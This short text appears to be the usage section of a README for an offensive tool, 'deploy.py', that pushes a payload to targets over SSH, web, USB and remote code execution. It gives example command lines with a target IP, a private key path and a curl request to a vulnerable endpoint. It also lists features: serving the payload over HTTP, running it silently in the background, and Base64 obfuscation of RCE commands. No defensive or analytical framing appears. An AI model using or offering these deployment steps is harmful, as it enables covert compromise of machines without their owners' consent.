SSH Deployment
python3 deploy.py ssh 192.168.1.100 user ~/.ssh/id_rsa 22

Web-Based Attack
python3 deploy.py web 192.168.1.100

USB Deployment
python3 deploy.py usb

RCE Exploitation
python3 deploy.py rce 192.168.1.100 "curl -X POST http://target/vuln"

HTTP Server: Serves the payload script to targets
Multiple Vectors: Supports SSH, web, USB, and RCE deployment
Background Execution: Runs payload silently on target
Cross-platform: Works on Linux, macOS, and Windows (with modifications)
Base64 Encoding: Obfuscates commands for RCE attacks